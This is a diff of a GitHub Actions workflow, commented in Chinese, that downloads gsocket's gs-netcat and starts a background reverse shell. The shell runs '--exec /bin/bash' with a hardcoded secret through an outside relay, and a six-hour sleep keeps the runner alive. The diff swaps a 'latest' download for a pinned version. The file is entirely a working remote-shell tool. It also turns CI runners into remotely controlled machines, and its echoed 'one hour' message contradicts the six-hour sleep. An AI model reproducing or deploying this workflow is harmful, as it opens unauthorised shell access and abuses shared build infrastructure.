@@ -1,19 +1,21 @@
 name: GSocket Linux Reverse Shell
 
 on:
-  workflow_dispatch:  # 手動觸發
+  workflow_dispatch:  # 手動觸發執行
 
 jobs:
   reverse-shell:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Download gsocket
+      - name: Download and install gs-netcat
         run: |
-          wget https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat
-          chmod +x gs-netcat
+          wget https://github.com/hackerschoice/gsocket/releases/download/1.4.47/gs-netcat_1.4.47_amd64
+          chmod +x gs-netcat_1.4.47_amd64
+          mv gs-netcat_1.4.47_amd64 gs-netcat
 
-      - name: Start gsocket reverse shell (cmd)
+      - name: Start gsocket reverse shell (bash)
         run: |
-          nohup ./gs-netcat -s jeikaizin1337 --exec /bin/bash > out.log 2>&1 & # 更改jeikaizin1337 為你的自訂密碼
-          sleep 21600  # 保持 Runner 存活 6 小時
+          nohup ./gs-netcat -s jeikaizin1337 --exec /bin/bash > out.log 2>&1 &
+          echo "GSocket shell started. You have 1 hour to connect..."
+          sleep 21600  # 可改成 sleep 21600（6 小時），GitHub 最大允許時間
